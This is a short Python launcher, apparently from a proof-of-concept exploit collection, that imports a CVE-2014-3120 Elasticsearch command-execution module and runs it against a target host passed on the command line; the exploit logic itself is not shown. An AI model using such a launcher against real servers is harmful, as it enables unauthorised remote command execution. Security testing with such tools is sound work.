from Poc.app.midware.elasticsearch.es_command_execute import CVE20143120

import sys

fallingSword = CVE20143120(sys.argv[1])
fallingSword.run()